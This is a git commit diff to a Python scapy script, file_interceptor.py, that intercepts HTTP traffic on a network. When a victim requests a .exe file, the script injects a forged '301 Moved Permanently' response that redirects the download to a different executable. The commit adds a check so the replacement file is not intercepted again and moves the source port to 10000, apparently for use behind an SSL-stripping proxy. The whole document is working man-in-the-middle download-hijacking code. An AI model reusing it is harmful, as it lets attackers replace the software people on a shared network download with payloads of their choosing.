a073e0fe2f4b756a9fc6cd90b11bd32f79e9e89e
Akash Krishnan <akashkrishnan98@gmail.com>
2020-02-18 07:30:16 +0530

    Update file_interceptor.py

--- file_interceptor.py
+++ file_interceptor.py
@@ -7,11 +7,12 @@ def file_interceptor(packet):
     scapy_packet=scapy.IP(packet.get_payload())
     if scapy_packet.haslayer(scapy.Raw):
         if scapy_packet[scapy.TCP].dport == 80:
-            if ".exe" in scapy_packet[scapy.Raw].load:
+            if ".exe" in scapy_packet[scapy.Raw].load and "3dbve_t" not in scapy_packet[scapy.Raw].load:
+                #3dbve_t is the name of the file tested at http://www.tucows.com/thankyou.html?swid=365586
                 ack_list.append(scapy_packet[scapy.TCP].ack)
                 print("[+] .exe requested")
                 print("[+] Intercepting File..")
-        elif scapy_packet[scapy.TCP].sport == 80:
+        elif scapy_packet[scapy.TCP].sport == 10000:
             if scapy_packet[scapy.TCP].seq in ack_list:
                 ack_list.remove(scapy_packet[scapy.TCP].seq)
                 scapy_packet[scapy.Raw].load="HTTP/1.1 301 Moved Permanently\nLocation: http://www.tucows.com/download/windows/files4/3dbve_t.exe\n\n"
